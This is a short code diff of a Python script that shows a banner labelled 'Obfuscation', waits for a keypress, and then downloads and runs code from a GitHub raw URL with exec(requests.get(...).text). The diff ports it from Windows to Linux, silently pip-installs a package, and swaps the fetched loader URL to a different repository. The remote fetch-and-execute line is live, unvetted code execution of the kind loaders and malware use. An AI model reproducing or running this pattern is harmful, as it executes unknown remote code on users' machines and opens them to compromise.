@@ -1,3 +1,7 @@
+try:
+  import getch
+except:
+  os.system('pip install getch')
 Obfuscation = """
 
 
@@ -26,7 +30,7 @@ Obfuscation = """
 print(Obfuscation)
 while True:
     print(Obfuscation)
-    msvcrt.getch()
-    os.system('cls')
+    getch.getch()
+    os.system('clear')
     print("Leaving Credit")
-    exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main').text)
+    exec(requests.get('https://raw.githubusercontent.com/zcharo99/MCC-Linux/main/Main').text)
